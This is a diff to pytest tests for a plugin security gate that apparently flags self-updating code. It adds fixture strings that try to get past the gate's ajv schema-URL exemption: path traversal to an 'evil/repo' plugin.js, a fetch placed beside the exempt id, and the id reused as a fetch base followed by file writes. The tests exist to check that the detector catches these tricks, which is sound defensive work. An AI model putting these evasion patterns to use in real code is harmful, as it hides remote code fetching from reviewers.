@@ -264,14 +264,20 @@ def test_an_attested_self_updater_still_fails_the_self_updater_gate(tmp_path, or
     assert "PASS" not in res.stdout
 
 
-def test_ajv_bundled_meta_schema_url_is_not_a_self_updater(tmp_path, origin):
+@pytest.mark.parametrize("declaration", [
+    '{$id: "https://raw.githubusercontent.com/ajv-validator/ajv/master/lib/refs/data.json#"}',
+    '{"$id": "https://raw.githubusercontent.com/ajv-validator/ajv/master/lib/refs/data.json#"}',
+    '{$id:"https://raw.githubusercontent.com/ajv-validator/ajv/master/lib/refs/data.json#"}',
+    "{$ref: 'https://raw.githubusercontent.com/ajv-validator/ajv/master/lib/refs/data.json#'}",
+], ids=["spaced", "quoted-key", "minified", "ref-single-quote"])
+def test_ajv_bundled_meta_schema_url_is_not_a_self_updater(tmp_path, origin, declaration):
     # ajv ships its draft-06 meta-schema with $id/$ref pointing at a raw.githubusercontent.com
-    # URL. The string is an inert JSON-schema identifier ajv matches by value against its own
-    # in-memory schema -- it never drives a request -- so a plugin that bundles ajv AND writes
-    # its own data files (both halves in one bundled file) must still pass.
+    # URL, in whatever quoting/spacing the bundler emitted. The string is an inert JSON-schema
+    # identifier ajv matches by value against its own in-memory schema -- it never drives a
+    # request -- so a plugin that bundles ajv AND writes its own data files (both halves in one
+    # bundled file) must still pass.
     (origin / "plugin" / "bundle.js").write_text(
-        '{$id: "https://raw.githubusercontent.com/ajv-validator/ajv/master/lib/refs/data.json#"}\n'
-        "fs.writeFileSync(target, body)\n", encoding="utf-8")
+        f"{declaration}\nfs.writeFileSync(target, body)\n", encoding="utf-8")
     sha = _commit(origin)
     entry = _entry(tmp_path, "ok.yaml", sha)
     res = _gate(tmp_path, origin, [entry])
@@ -279,29 +285,26 @@ def test_ajv_bundled_meta_schema_url_is_not_a_self_updater(tmp_path, origin):
     assert f"PASS: {entry}" in res.stdout
 
 
-def test_a_real_fetch_disguised_under_the_ajv_refs_path_still_fails(tmp_path, origin):
-    # The exemption is pinned to the exact data.json# id, so neither a sibling path under
-    # lib/refs nor a traversal out of it escapes the gate.
+_AJV_ID = "https://raw.githubusercontent.com/ajv-validator/ajv/master/lib/refs/data.json#"
+
+
+@pytest.mark.parametrize("source", [
+    # a traversal out of lib/refs
+    "fetch('https://raw.githubusercontent.com/ajv-validator/ajv/master/lib/refs/../../payload.js')",
+    # a traversal out of data.json itself: only the "#" ends the exempt id
+    "fetch('https://raw.githubusercontent.com/ajv-validator/ajv/master/lib/refs/data.json"
+    "/../../../../../../evil/repo/main/plugin.js')",
+    # the exempt id must not hide a real fetch after it on the same minified line
+    f"{{$id:'{_AJV_ID}'}};fetch('https://raw.githubusercontent.com/o/r/main/plugin.js')",
+    # the exempt literal reused as an executable fetch base, not a schema declaration
+    f"const u = new URL('/evil/repo/main/plugin.js', '{_AJV_ID}'); fetch(u)",
+], ids=["refs_traversal", "data_json_traversal", "beside_ajv_id", "fetch_base"])
+def test_a_real_fetch_near_or_disguised_as_the_ajv_id_still_fails(tmp_path, origin, source):
+    # The exemption removes ONLY the inert ajv $id/$ref declaration; any real GitHub fetch that
+    # remains -- a sibling/traversal path, a fetch beside the id, or the id reused as a fetch
+    # base -- still trips the gate.
     (origin / "plugin" / "sneaky.js").write_text(
-        "fetch('https://raw.githubusercontent.com/ajv-validator/ajv/master/lib/refs/../../payload.js')\n"
-        "fs.writeFileSync(target, body)\n", encoding="utf-8")
-    sha = _commit(origin)
-    entry = _entry(tmp_path, "evil.yaml", sha)
-    res = _gate(tmp_path, origin, [entry])
-    assert res.returncode != 0
-    assert "self-updating code" in res.stdout
-    assert "PASS" not in res.stdout
-
-
-def test_the_exempt_ajv_url_used_as_an_executable_fetch_base_still_fails(tmp_path, origin):
-    # The exemption is pinned to the `$id: "`/`$ref: "` schema-declaration prefix, not just the
-    # URL, so the same literal used as a `new URL(path, base)` fetch base -- which resolves to a
-    # real GitHub download -- is NOT exempt and still trips the gate.
-    (origin / "plugin" / "base.js").write_text(
-        "const u = new URL('/evil/repo/main/plugin.js', "
-        "'https://raw.githubusercontent.com/ajv-validator/ajv/master/lib/refs/data.json#');\n"
-        "fetch(u).then(r => r.text()).then(body => fs.writeFileSync(__filename, body));\n",
-        encoding="utf-8")
+        f"{source}\nfs.writeFileSync(target, body)\n", encoding="utf-8")
     sha = _commit(origin)
     entry = _entry(tmp_path, "evil.yaml", sha)
     res = _gate(tmp_path, origin, [entry])
